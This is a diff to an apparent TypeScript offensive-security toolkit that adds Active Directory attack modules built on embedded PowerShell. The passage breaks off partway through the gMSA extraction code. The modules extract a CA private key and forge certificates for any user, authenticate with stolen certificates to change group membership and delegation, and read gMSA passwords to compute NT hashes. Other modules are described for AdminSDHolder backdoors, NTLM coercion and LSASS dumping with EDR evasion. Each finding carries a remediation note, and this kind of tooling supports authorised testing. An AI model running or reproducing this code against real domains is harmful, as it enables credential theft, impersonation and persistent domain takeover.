@@ -367,6 +367,41 @@ const PROGRAMS = {
       "Recover NT hash from PKINIT certificate authentication — authenticate with a certificate via Kerberos PKINIT, then extract the NTLM hash from the PAC_CREDENTIAL_INFO in the AS-REP. Completes the shadow_creds → certificate → NT hash chain. The recovered hash can be used for pass-the-hash or DCSync",
     args: "--cert CERT_PATH [--password CERT_PASS] --user USER --domain DOMAIN [--dc DC_HOST]",
   },
+  golden_cert: {
+    description:
+      "CA private key theft and certificate forgery (Golden Certificate) — enumerate Certificate Authorities, extract CA private key via certutil backup or DPAPI decryption, then forge arbitrary certificates for any domain user. The certificate equivalent of a Golden Ticket — with the CA key, forge unlimited certs offline for domain persistence that survives krbtgt rotation",
+    args: "--action <enum|extract|forge> [--ca CA_NAME] [--target-user USER] [--outfile PATH]",
+  },
+  pass_the_cert: {
+    description:
+      "Certificate-based authentication to AD services — authenticate to LDAP via Schannel TLS client certificate or to Kerberos via PKINIT. Used after shadow_creds, adcs_abuse, or golden_cert to leverage a stolen/forged certificate for AD access without knowing the password. Supports LDAP bind with startTLS and Kerberos TGT request",
+    args: "--cert CERT_PATH [--password CERT_PASS] --target LDAP_SERVER --action <ldap-shell|add-user-to-group|rbcd|shadow-cred> [--target-user USER] [--target-group GROUP]",
+  },
+  gmsa_dump: {
+    description:
+      "Group Managed Service Account password extraction — enumerate all gMSA accounts, check PrincipalsAllowedToRetrieveManagedPassword ACL, read msDS-ManagedPassword blob and compute NT hash. GoldenGMSA mode extracts KDS root key for offline computation of any gMSA password without AD access",
+    args: "--action <enum|extract|golden> [--target GMSA_NAME] [--dc DC_HOST]",
+  },
+  adminsdholder: {
+    description:
+      "AdminSDHolder ACL persistence — check, backdoor, or clean AdminSDHolder security descriptor. SDProp propagates AdminSDHolder ACL to all protected objects (Domain/Enterprise/Schema Admins, Account/Backup/Print/Server Operators) every 60 minutes. Adding GenericAll to AdminSDHolder grants persistent control over all privileged groups — survives password resets and manual ACL cleanup",
+    args: "--action <check|backdoor|clean> --principal ATTACKER_USER",
+  },
+  rbcd_chain: {
+    description:
+      "Full Resource-Based Constrained Delegation exploitation chain — check MachineAccountQuota and RBCD config, create machine account (MAQ abuse), set msDS-AllowedToActOnBehalfOfOtherIdentity on target, perform S4U2Self+S4U2Proxy to get admin ticket, authenticate to target. Automated end-to-end from standard domain user to local admin on target host",
+    args: "--action <check|exploit> --target TARGET_HOST [--new-machine-name NAME] [--new-password PASS] [--impersonate USER]",
+  },
+  remote_monologue: {
+    description:
+      "DCOM-based NTLM credential harvesting (IBM X-Force 2025) — coerce NTLM authentication from remote hosts via DCOM object manipulation without touching LSASS. Methods: ServerDataCollectorSet (Performance Monitor XML injection), FileSystemImage (IMAPI2 UNC path), UpdateSession (WSUS server redirect). Different detection signature from PetitPotam/PrinterBug",
+    args: "--target HOST --listener LISTENER_IP [--method all|datacollector|filesystem|update] [--port LISTENER_PORT]",
+  },
+  nanodump_advanced: {
+    description:
+      "Advanced LSASS memory dumping with EDR bypass — multiple techniques to dump LSASS while evading endpoint detection. Fork: clone LSASS via NtCreateProcessEx and dump the clone. Snapshot: PssCreateSnapshot API. SSP: inject custom Security Package via AddSecurityPackage to intercept credentials. Seclogon: leak LSASS handle via Secondary Logon service. Each method bypasses different EDR hooks",
+    args: "--method <fork|snapshot|ssp|seclogon> [--outfile PATH]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -11676,6 +11711,1778 @@ Write-Output "[*] Detection: Event 4768 with PreAuthType=16 (PKINIT)"
 
 
 
+
+// ── Certificate & Advanced Credential Programs ──
+
+async function goldenCert(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const ca = argVal(args, "--ca")
+  const targetUser = argVal(args, "--target-user")
+  const outfile = argVal(args, "--outfile")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Golden Certificate — CA Private Key Attack\n"]
+
+  if (action === "enum") {
+    const script = `
+# Enumerate Certificate Authorities
+Write-Output "[*] Enumerating Enterprise CAs..."
+$configContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
+$caContainer = [ADSI]"LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,$configContext"
+
+foreach ($caEntry in $caContainer.Children) {
+    $caName = $caEntry.Properties["cn"][0]
+    $caDnsName = $caEntry.Properties["dNSHostName"][0]
+    $caCert = $caEntry.Properties["cACertificate"][0]
+    $caTemplates = $caEntry.Properties["certificateTemplates"]
+
+    Write-Output ""
+    Write-Output "[+] CA: $caName"
+    Write-Output "    Host: $caDnsName"
+    Write-Output "    Templates: $($caTemplates.Count)"
+
+    # Check CA certificate details
+    if ($caCert) {
+        $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(,$caCert)
+        Write-Output "    Subject: $($cert.Subject)"
+        Write-Output "    Issuer: $($cert.Issuer)"
+        Write-Output "    NotAfter: $($cert.NotAfter)"
+        Write-Output "    Thumbprint: $($cert.Thumbprint)"
+        Write-Output "    KeyAlgorithm: $($cert.PublicKey.Key.KeySize)-bit $($cert.PublicKey.Oid.FriendlyName)"
+    }
+}
+
+# Check if current user can backup CA
+Write-Output ""
+Write-Output "[*] Checking CA backup permissions..."
+try {
+    $caInfo = certutil -config "${ca || ''}" -CAInfo 2>&1
+    if ($caInfo -match "CA type") {
+        Write-Output "[+] certutil -CAInfo accessible — may have backup rights"
+    }
+} catch {
+    Write-Output "[-] Cannot query CA info"
+}
+
+# Check for CA private key in local cert store (if running on CA server)
+Write-Output ""
+Write-Output "[*] Checking local machine cert store for CA keys..."
+$caCerts = Get-ChildItem Cert:\\LocalMachine\\My | Where-Object { $_.HasPrivateKey -and $_.Extensions | Where-Object { $_.Oid.FriendlyName -eq "Basic Constraints" -and $_.CertificateAuthority } }
+foreach ($c in $caCerts) {
+    Write-Output "[!] CA certificate with private key found locally!"
+    Write-Output "    Subject: $($c.Subject)"
+    Write-Output "    Thumbprint: $($c.Thumbprint)"
+    Write-Output "    Exportable: check with certutil -store My $($c.Thumbprint)"
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+    findings.push({
+      checkId: "WIN-GCERT-001",
+      provider: "windows",
+      severity: "informational",
+      status: "ENUMERATED",
+      resource: "adcs://enterprise-cas",
+      title: "Certificate Authorities enumerated",
+      details: result.stdout.substring(0, 500),
+      remediation: "Restrict CA backup permissions. Monitor certutil usage and CA private key access",
+    })
+  } else if (action === "extract") {
+    if (!ca) return { output: "[!] Required: --ca CA_NAME", findings }
+    const script = `
+# Extract CA private key
+Write-Output "[*] Attempting CA private key extraction for: ${ca}"
+
+# Method 1: certutil backup (requires CA admin rights)
+$backupDir = "C:\\Windows\\Temp\\cs-ca-backup-" + (Get-Random -Maximum 99999)
+New-Item -ItemType Directory -Path $backupDir -Force | Out-Null
+
+Write-Output "[*] Method 1: certutil -backup..."
+try {
+    $backupResult = certutil -backup $backupDir 2>&1
+    if (Test-Path "$backupDir\\*.p12") {
+        Write-Output "[+] CA backup successful!"
+        $p12Files = Get-ChildItem "$backupDir\\*.p12"
+        foreach ($f in $p12Files) {
+            Write-Output "    P12: $($f.FullName) ($($f.Length) bytes)"
+        }
+        Write-Output "[+] P12 contains CA private key — import and forge certs"
+    } else {
+        Write-Output "[-] Backup completed but no P12 found"
+        Write-Output "    Output: $backupResult"
+    }
+} catch {
+    Write-Output "[-] certutil backup failed: $($_.Exception.Message)"
+}
+
+# Method 2: Check registry for CA private key container
+Write-Output ""
+Write-Output "[*] Method 2: Registry CA key container check..."
+try {
+    $caKeyReg = Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Cryptography\\Services\\${ca}\\Configuration" -ErrorAction SilentlyContinue
+    if ($caKeyReg) {
+        Write-Output "[+] CA configuration found in registry"
+        Write-Output "    CAType: $($caKeyReg.CAType)"
+        if ($caKeyReg.PSObject.Properties["CACertHash"]) {
+            Write-Output "    CACertHash: $($caKeyReg.CACertHash)"
+        }
+    }
+} catch {
+    Write-Output "[-] Cannot read CA registry: $_"
+}
+
+# Method 3: Try to export from local cert store
+Write-Output ""
+Write-Output "[*] Method 3: Local cert store export..."
+$localCA = Get-ChildItem Cert:\\LocalMachine\\My | Where-Object { $_.Subject -match "${ca}" -and $_.HasPrivateKey }
+if ($localCA) {
+    $exportPath = "${outfile || "$backupDir\\ca-key.pfx"}"
+    try {
+        $pwd = ConvertTo-SecureString -String "CyberStr1ke!" -Force -AsPlainText
+        Export-PfxCertificate -Cert $localCA[0] -FilePath $exportPath -Password $pwd -Force | Out-Null
+        Write-Output "[+] CA certificate + private key exported!"
+        Write-Output "    File: $exportPath"
+        Write-Output "    Password: CyberStr1ke!"
+        Write-Output "[+] Use this PFX to forge certificates for any user"
+    } catch {
+        Write-Output "[-] Export failed (key may not be exportable): $_"
+        Write-Output "[*] Try: mimikatz # crypto::capi or crypto::cng to patch CryptoAPI"
+    }
+} else {
+    Write-Output "[-] No CA cert with private key found in local store"
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+    if (result.stdout.includes("private key exported") || result.stdout.includes("backup successful")) {
+      findings.push({
+        checkId: "WIN-GCERT-002",
+        provider: "windows",
+        severity: "critical",
+        status: "EXTRACTED",
+        resource: `adcs://${ca}`,
+        title: "CA private key extracted — Golden Certificate possible",
+        details: "CA private key extracted. Can forge certificates for any domain user, enabling persistent domain access that survives krbtgt rotation",
+        remediation: "Rotate CA keys immediately. Restrict CA backup permissions. Enable CA audit logging",
+      })
+    }
+  } else if (action === "forge") {
+    if (!ca) return { output: "[!] Required: --ca CA_NAME", findings }
+    if (!targetUser) return { output: "[!] Required: --target-user USER", findings }
+    const certPath = outfile || "C:\\Windows\\Temp\\cs-forged-cert.pfx"
+    const script = `
+# Forge certificate for target user using stolen CA key
+Write-Output "[*] Forging certificate for: ${targetUser}"
+
+# Find CA cert in store
+$caCert = Get-ChildItem Cert:\\LocalMachine\\My | Where-Object { $_.Subject -match "${ca}" -and $_.HasPrivateKey } | Select-Object -First 1
+if (-not $caCert) {
+    # Try from backup PFX
+    $backupDir = "C:\\Windows\\Temp\\cs-ca-backup-*"
+    $pfxFiles = Get-ChildItem $backupDir -Filter "*.p12" -Recurse -ErrorAction SilentlyContinue
+    if ($pfxFiles) {
+        $pwd = ConvertTo-SecureString -String "CyberStr1ke!" -Force -AsPlainText
+        $caCert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($pfxFiles[0].FullName, $pwd, "Exportable")
+        Write-Output "[+] Loaded CA cert from backup PFX"
+    } else {
+        Write-Output "[!] CA certificate not found — extract first with --action extract"
+        exit 1
+    }
+}
+
+# Look up target user's UPN
+$searcher = New-Object System.DirectoryServices.DirectorySearcher
+$searcher.Filter = "(sAMAccountName=${targetUser})"
+$searcher.PropertiesToLoad.AddRange(@("userPrincipalName", "distinguishedName"))
+$userResult = $searcher.FindOne()
+$upn = if ($userResult) { $userResult.Properties["userprincipalname"][0] } else { "${targetUser}@" + [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name }
+$dn = if ($userResult) { $userResult.Properties["distinguishedname"][0] } else { "" }
+Write-Output "[+] Target UPN: $upn"
+Write-Output "[+] Target DN: $dn"
+
+# Generate new RSA key pair for forged cert
+Add-Type -AssemblyName System.Security
+$rsa = [System.Security.Cryptography.RSA]::Create(2048)
+
+# Create certificate request
+$certReq = [System.Security.Cryptography.X509Certificates.CertificateRequest]::new(
+    "CN=${targetUser}",
+    $rsa,
+    [System.Security.Cryptography.HashAlgorithmName]::SHA256,
+    [System.Security.Cryptography.RSASignaturePadding]::Pkcs1
+)
+
+# Add SAN with UPN
+$sanBuilder = [System.Security.Cryptography.X509Certificates.SubjectAlternativeNameBuilder]::new()
+$sanBuilder.AddUserPrincipalName($upn)
+$certReq.CertificateExtensions.Add($sanBuilder.Build())
+
+# Add Client Auth EKU
+$ekuOid = [System.Security.Cryptography.OidCollection]::new()
+$ekuOid.Add([System.Security.Cryptography.Oid]::new("1.3.6.1.5.5.7.3.2")) | Out-Null  # Client Auth
+$ekuOid.Add([System.Security.Cryptography.Oid]::new("1.3.6.1.4.1.311.20.2.2")) | Out-Null  # Smart Card Logon
+$certReq.CertificateExtensions.Add([System.Security.Cryptography.X509Certificates.X509EnhancedKeyUsageExtension]::new($ekuOid, $false))
+
+# Sign with CA key
+$serial = [byte[]]::new(16)
+[System.Security.Cryptography.RandomNumberGenerator]::Fill($serial)
+$notBefore = [DateTimeOffset]::UtcNow.AddDays(-1)
+$notAfter = [DateTimeOffset]::UtcNow.AddYears(1)
+
+$forgedCert = $certReq.Create($caCert, $notBefore, $notAfter, $serial)
+
+# Export with private key
+$forgedWithKey = $forgedCert.CopyWithPrivateKey($rsa)
+$pfxBytes = $forgedWithKey.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, "CyberStr1ke!")
+[System.IO.File]::WriteAllBytes("${certPath}", $pfxBytes)
+
+Write-Output ""
+Write-Output "[+] FORGED CERTIFICATE CREATED!"
+Write-Output "    Subject: CN=${targetUser}"
+Write-Output "    SAN/UPN: $upn"
+Write-Output "    EKU: Client Auth + Smart Card Logon"
+Write-Output "    Signed by: $($caCert.Subject)"
+Write-Output "    Valid: $($notBefore.ToString('yyyy-MM-dd')) to $($notAfter.ToString('yyyy-MM-dd'))"
+Write-Output "    File: ${certPath}"
+Write-Output "    Password: CyberStr1ke!"
+Write-Output ""
+Write-Output "[*] Next steps:"
+Write-Output "    1. winhook pass_the_cert --cert ${certPath} --password CyberStr1ke! --target DC --action ldap-shell"
+Write-Output "    2. winhook unpac_hash --cert ${certPath} --password CyberStr1ke! --user ${targetUser} --domain DOMAIN"
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+    if (result.stdout.includes("FORGED CERTIFICATE CREATED")) {
+      findings.push({
+        checkId: "WIN-GCERT-003",
+        provider: "windows",
+        severity: "critical",
+        status: "FORGED",
+        resource: `adcs://${targetUser}`,
+        title: `Golden Certificate forged for ${targetUser}`,
+        details: `Forged certificate at ${certPath} — can authenticate as ${targetUser} via PKINIT or Schannel`,
+        remediation: "Revoke all certificates signed by compromised CA. Regenerate CA key pair. Monitor certificate-based authentication events (4768 with pre-auth type 16)",
+      })
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function passTheCert(args: string[], timeout: number): Promise<HookResult> {
+  const cert = argVal(args, "--cert")
+  const certPass = argVal(args, "--password") || ""
+  const target = argVal(args, "--target")
+  const action = argVal(args, "--action") || "ldap-shell"
+  const targetUser = argVal(args, "--target-user")
+  const targetGroup = argVal(args, "--target-group")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Pass-the-Certificate — Certificate-Based Authentication\n"]
+
+  if (!cert) return { output: "[!] Required: --cert CERT_PATH", findings }
+  if (!target) return { output: "[!] Required: --target LDAP_SERVER", findings }
+
+  const script = `
+# Load certificate
+Write-Output "[*] Loading certificate: ${cert}"
+try {
+    $certObj = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2("${cert}", "${certPass}", "Exportable")
+    Write-Output "[+] Certificate loaded"
+    Write-Output "    Subject: $($certObj.Subject)"
+    Write-Output "    Issuer: $($certObj.Issuer)"
+    Write-Output "    HasPrivateKey: $($certObj.HasPrivateKey)"
+    Write-Output "    Thumbprint: $($certObj.Thumbprint)"
+
+    # Extract UPN from SAN
+    $san = $certObj.Extensions | Where-Object { $_.Oid.FriendlyName -eq "Subject Alternative Name" }
+    if ($san) {
+        $sanText = $san.Format($false)
+        Write-Output "    SAN: $sanText"
+    }
+} catch {
+    Write-Output "[!] Failed to load certificate: $($_.Exception.Message)"
+    exit 1
+}
+
+if (-not $certObj.HasPrivateKey) {
+    Write-Output "[!] Certificate must have a private key for authentication"
+    exit 1
+}
+
+# Connect to LDAP with certificate via Schannel
+Write-Output ""
+Write-Output "[*] Connecting to ${target} via LDAPS with certificate..."
+
+Add-Type -AssemblyName System.DirectoryServices.Protocols
+
+$ldapConn = New-Object System.DirectoryServices.Protocols.LdapConnection("${target}:636")
+$ldapConn.SessionOptions.SecureSocketLayer = $true
+$ldapConn.SessionOptions.VerifyServerCertificate = { $true }
+$ldapConn.AuthType = [System.DirectoryServices.Protocols.AuthType]::External
+
+# Set client certificate
+$ldapConn.ClientCertificates.Add($certObj) | Out-Null
+
+try {
+    $ldapConn.Bind()
+    Write-Output "[+] LDAPS bind successful with certificate!"
+
+    # Get current identity
+    $whoami = New-Object System.DirectoryServices.Protocols.SearchRequest(
+        "",
+        "(objectClass=*)",
+        [System.DirectoryServices.Protocols.SearchScope]::Base,
+        @("tokenGroups", "objectSid")
+    )
+    $whoamiResult = $ldapConn.SendRequest($whoami)
+    Write-Output "[+] Authenticated successfully via Schannel"
+
+    ${action === "add-user-to-group" ? `
+    # Add user to group
+    if (-not "${targetUser}" -or -not "${targetGroup}") {
+        Write-Output "[!] Required: --target-user and --target-group"
+    } else {
+        Write-Output "[*] Adding ${targetUser} to ${targetGroup}..."
+        $searchReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
+            $null,
+            "(sAMAccountName=${targetGroup})",
+            [System.DirectoryServices.Protocols.SearchScope]::Subtree,
+            @("distinguishedName")
+        )
+        $groupResult = $ldapConn.SendRequest($searchReq)
+        if ($groupResult.Entries.Count -gt 0) {
+            $groupDN = $groupResult.Entries[0].DistinguishedName
+
+            $userSearchReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
+                $null,
+                "(sAMAccountName=${targetUser})",
+                [System.DirectoryServices.Protocols.SearchScope]::Subtree,
+                @("distinguishedName")
+            )
+            $userResult = $ldapConn.SendRequest($userSearchReq)
+            $userDN = $userResult.Entries[0].DistinguishedName
+
+            $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
+                $groupDN,
+                [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add,
+                "member",
+                $userDN
+            )
+            $ldapConn.SendRequest($mod) | Out-Null
+            Write-Output "[+] Successfully added $userDN to $groupDN"
+        }
+    }
+    ` : action === "rbcd" ? `
+    # Set RBCD on target
+    Write-Output "[*] Setting RBCD delegation..."
+    if (-not "${targetUser}") {
+        Write-Output "[!] Required: --target-user (machine account to delegate from)"
+    } else {
+        $searchReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
+            $null,
+            "(sAMAccountName=${targetUser})",
+            [System.DirectoryServices.Protocols.SearchScope]::Subtree,
+            @("objectSid")
+        )
+        $machineResult = $ldapConn.SendRequest($searchReq)
+        if ($machineResult.Entries.Count -gt 0) {
+            $machineSid = New-Object System.Security.Principal.SecurityIdentifier($machineResult.Entries[0].Attributes["objectSid"][0], 0)
+            Write-Output "[+] Machine SID: $machineSid"
+
+            # Build security descriptor
+            $sd = New-Object System.DirectoryServices.ActiveDirectorySecurity
+            $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+                $machineSid,
+                [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
+                [System.Security.AccessControl.AccessControlType]::Allow
+            )
+            $sd.AddAccessRule($ace)
+            $sdBytes = $sd.GetSecurityDescriptorBinaryForm()
+
+            # Find target computer
+            $targetSearchReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
+                $null,
+                "(&(objectCategory=computer)(sAMAccountName=${target}$))",
+                [System.DirectoryServices.Protocols.SearchScope]::Subtree,
+                @("distinguishedName")
+            )
+            $targetResult = $ldapConn.SendRequest($targetSearchReq)
+            if ($targetResult.Entries.Count -gt 0) {
+                $targetDN = $targetResult.Entries[0].DistinguishedName
+                $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
+                    $targetDN,
+                    [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
+                    "msDS-AllowedToActOnBehalfOfOtherIdentity",
+                    $sdBytes
+                )
+                $ldapConn.SendRequest($mod) | Out-Null
+                Write-Output "[+] RBCD set on $targetDN for $machineSid"
+            }
+        }
+    }
+    ` : action === "shadow-cred" ? `
+    # Add shadow credential
+    Write-Output "[*] Adding shadow credential to target..."
+    if (-not "${targetUser}") {
+        Write-Output "[!] Required: --target-user"
+    } else {
+        Write-Output "[*] Generating key credential..."
+        $searchReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
+            $null,
+            "(sAMAccountName=${targetUser})",
+            [System.DirectoryServices.Protocols.SearchScope]::Subtree,
+            @("distinguishedName", "msDS-KeyCredentialLink")
+        )
+        $targetResult = $ldapConn.SendRequest($searchReq)
+        if ($targetResult.Entries.Count -gt 0) {
+            $targetDN = $targetResult.Entries[0].DistinguishedName
+            Write-Output "[+] Target: $targetDN"
+            Write-Output "[+] Use shadow_creds tool for full KeyCredential generation"
+            Write-Output "    winhook shadow_creds --target ${targetUser} --action add"
+        }
+    }
+    ` : `
+    # LDAP shell — enumerate with cert auth
+    Write-Output ""
+    Write-Output "[*] Querying domain info via cert-authenticated LDAP..."
+    $domainReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
+        "",
+        "(objectClass=*)",
+        [System.DirectoryServices.Protocols.SearchScope]::Base,
+        @("defaultNamingContext", "dnsHostName", "serverName")
+    )
+    $domainResult = $ldapConn.SendRequest($domainReq)
+    if ($domainResult.Entries.Count -gt 0) {
+        $entry = $domainResult.Entries[0]
+        Write-Output "[+] Domain: $($entry.Attributes['defaultNamingContext'][0])"
+        Write-Output "[+] DC: $($entry.Attributes['dnsHostName'][0])"
+    }
+
+    # List privileged users
+    $privReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
+        $null,
+        "(&(objectCategory=person)(adminCount=1))",
+        [System.DirectoryServices.Protocols.SearchScope]::Subtree,
+        @("sAMAccountName", "distinguishedName")
+    )
+    $privResult = $ldapConn.SendRequest($privReq)
+    Write-Output ""
+    Write-Output "[+] Privileged users (adminCount=1): $($privResult.Entries.Count)"
+    foreach ($e in $privResult.Entries) {
+        Write-Output "    $($e.Attributes['sAMAccountName'][0])"
+    }
+    `}
+
+} catch {
+    Write-Output "[!] LDAPS bind failed: $($_.Exception.Message)"
+    Write-Output "[*] Ensure LDAPS is available on port 636 and the certificate has Client Auth EKU"
+}
+
+$ldapConn.Dispose()
+`
+  const result = await ps(script, timeout)
+  output.push(result.stdout)
+
+  if (result.stdout.includes("bind successful")) {
+    findings.push({
+      checkId: "WIN-PTC-001",
+      provider: "windows",
+      severity: "critical",
+      status: "AUTHENTICATED",
+      resource: `ldap://${target}`,
+      title: "Certificate-based LDAP authentication successful",
+      details: `Authenticated to ${target} using certificate ${cert}. Action: ${action}`,
+      remediation: "Enable LDAP channel binding. Require strong certificate mapping (StrongCertificateBindingEnforcement=2). Monitor 4768 events with pre-auth type 16",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function gmsaDump(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const target = argVal(args, "--target")
+  const dc = argVal(args, "--dc")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] gMSA Password Extraction\n"]
+
+  if (action === "enum") {
+    const script = `
+# Enumerate all gMSA accounts
+Write-Output "[*] Enumerating Group Managed Service Accounts..."
+$searcher = New-Object System.DirectoryServices.DirectorySearcher
+$searcher.Filter = "(objectClass=msDS-GroupManagedServiceAccount)"
+$searcher.PropertiesToLoad.AddRange(@(
+    "sAMAccountName", "distinguishedName", "servicePrincipalName",
+    "msDS-ManagedPasswordInterval", "msDS-ManagedPasswordId",
+    "msDS-GroupMSAMembership", "PrincipalsAllowedToRetrieveManagedPassword",
+    "objectSid", "whenCreated", "description"
+))
+
+$results = $searcher.FindAll()
+Write-Output "[+] Found $($results.Count) gMSA accounts"
+
+$readable = @()
+
+foreach ($r in $results) {
+    $name = $r.Properties["samaccountname"][0]
+    $dn = $r.Properties["distinguishedname"][0]
+    $spns = $r.Properties["serviceprincipalname"]
+    $interval = $r.Properties["msds-managedpasswordinterval"]
+    $created = $r.Properties["whencreated"]
+    $desc = $r.Properties["description"]
+
+    Write-Output ""
+    Write-Output "[+] gMSA: $name"
+    Write-Output "    DN: $dn"
+    if ($desc.Count -gt 0) { Write-Output "    Description: $($desc[0])" }
+    if ($interval.Count -gt 0) { Write-Output "    Password Interval: $($interval[0]) days" }
+    if ($created.Count -gt 0) { Write-Output "    Created: $($created[0])" }
+
+    if ($spns.Count -gt 0) {
+        Write-Output "    SPNs:"
+        foreach ($spn in $spns) { Write-Output "      - $spn" }
+    }
+
+    # Check PrincipalsAllowedToRetrieveManagedPassword
+    $membership = $r.Properties["msds-groupmsamembership"]
+    if ($membership.Count -gt 0) {
+        Write-Output "    Allowed to retrieve password:"
+        try {
+            $sd = New-Object System.DirectoryServices.ActiveDirectorySecurity
+            $sd.SetSecurityDescriptorBinaryForm($membership[0])
+            $rules = $sd.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])
+            foreach ($rule in $rules) {
+                Write-Output "      - $($rule.IdentityReference)"
+                # Check if current user matches
+                $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+                $currentGroups = $currentUser.Groups | ForEach-Object { $_.Translate([System.Security.Principal.NTAccount]).Value }
+                $identity = $rule.IdentityReference.Value
+                if ($identity -eq $currentUser.Name -or $currentGroups -contains $identity) {
+                    Write-Output "      [!] CURRENT USER CAN READ THIS gMSA PASSWORD!"
+                    $readable += $name
+                }
+            }
+        } catch {
+            Write-Output "      (could not parse membership descriptor)"
+        }
+    }
+}
+
+Write-Output ""
+if ($readable.Count -gt 0) {
+    Write-Output "[+] READABLE gMSA accounts: $($readable -join ', ')"
+    Write-Output "[*] Extract with: winhook gmsa_dump --action extract --target GMSA_NAME"
+} else {
+    Write-Output "[-] No gMSA passwords readable by current user"
+    Write-Output "[*] Need membership in PrincipalsAllowedToRetrieveManagedPassword"
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+    const count = (result.stdout.match(/gMSA:/g) || []).length
+    findings.push({
+      checkId: "WIN-GMSA-001",
+      provider: "windows",
+      severity: result.stdout.includes("CAN READ") ? "critical" : "informational",
+      status: "ENUMERATED",
+      resource: "ad://gmsa-accounts",
+      title: `${count} gMSA accounts enumerated`,
+      details: result.stdout.substring(0, 500),
+      remediation: "Restrict PrincipalsAllowedToRetrieveManagedPassword to only necessary service hosts",
+    })
+  } else if (action === "extract") {
+    if (!target) return { output: "[!] Required: --target GMSA_NAME", findings }
+    const script = `
+# Extract gMSA password and compute NT hash
+Write-Output "[*] Extracting password for gMSA: ${target}"
+
+$searcher = New-Object System.DirectoryServices.DirectorySearcher
+$searcher.Filter = "(&(objectClass=msDS-GroupManagedServiceAccount)(sAMAccountName=${target}))"
+$searcher.PropertiesToLoad.AddRange(@("sAMAccountName", "msDS-ManagedPassword", "objectSid"))
+
+$result = $searcher.FindOne()
+if (-not $result) {
+    Write-Output "[!] gMSA account '${target}' not found"
+    exit 1
+}
+
+$managedPwd = $result.Properties["msds-managedpassword"]
+if ($managedPwd.Count -eq 0) {
+    Write-Output "[!] Cannot read msDS-ManagedPassword — access denied"
+    Write-Output "[*] Current user is not in PrincipalsAllowedToRetrieveManagedPassword"
+    exit 1
+}
+
+$blob = [byte[]]$managedPwd[0]
+Write-Output "[+] msDS-ManagedPassword blob retrieved ($($blob.Length) bytes)"
+
+# Parse MSDS-MANAGEDPASSWORD_BLOB structure
+# Version (2 bytes) + Reserved (2 bytes) + Length (4 bytes) + CurrentPasswordOffset (2 bytes)
+$version = [BitConverter]::ToUInt16($blob, 0)
+$length = [BitConverter]::ToUInt32($blob, 4)
+$currentPwdOffset = [BitConverter]::ToUInt16($blob, 8)
+
+Write-Output "[+] Blob version: $version, Length: $length"
+Write-Output "[+] Current password offset: $currentPwdOffset"
+
+# Extract current password (Unicode string)
+$oldPwdOffset = [BitConverter]::ToUInt16($blob, 10)
+$pwdLength = if ($oldPwdOffset -gt 0) { $oldPwdOffset - $currentPwdOffset } else { $blob.Length - $currentPwdOffset }
+
+# Cap at reasonable length
+if ($pwdLength -gt 256) { $pwdLength = 256 }
+$passwordBytes = $blob[$currentPwdOffset..($currentPwdOffset + $pwdLength - 1)]
+
+Write-Output "[+] Password bytes extracted ($pwdLength bytes)"
+
+# Compute NT hash (MD4 of UTF-16LE password)
+Add-Type -TypeDefinition @"
+using System;
+using System.Security.Cryptography;
+using System.Runtime.InteropServices;
+
+public class NTHash {
+    [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
+    public static extern int SystemFunction007(ref UNICODE_STRING str, byte[] hash);
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct UNICODE_STRING {
+        public ushort Length;
+        public ushort MaximumLength;
+        public IntPtr Buffer;
+    }
+
+    public static byte[] ComputeMD4(byte[] data) {
+        // Simple MD4 via BCrypt
+        byte[] hash = new byte[16];
+        IntPtr ptr = Marshal.AllocHGlobal(data.Length);
+        Marshal.Copy(data, 0, ptr, data.Length);
+        UNICODE_STRING us = new UNICODE_STRING();
+        us.Length = (ushort)data.Length;
+        us.MaximumLength = (ushort)data.Length;
+        us.Buffer = ptr;
+        SystemFunction007(ref us, hash);
+        Marshal.FreeHGlobal(ptr);
+        return hash;
+    }
+}
+"@
+
+try {
+    $ntHash = [NTHash]::ComputeMD4($passwordBytes)
+    $hashHex = ($ntHash | ForEach-Object { $_.ToString("x2") }) -join ""
+    Write-Output ""
+    Write-Output "[+] ================================"
+    Write-Output "[+] gMSA: ${target}"
+    Write-Output "[+] NT HASH: $hashHex"
+    Write-Output "[+] ================================"
+    Write-Output ""
+    Write-Output "[*] Use this hash for:"
+    Write-Output "    - Pass-the-hash: winhook wmi_exec --target HOST --user ${target} --hash $hashHex"
+    Write-Output "    - DCSync: winhook dcsync --target krbtgt (if gMSA has replication rights)"
+    Write-Output "    - Silver ticket: winhook silver_ticket --service-hash $hashHex --spn SPN"
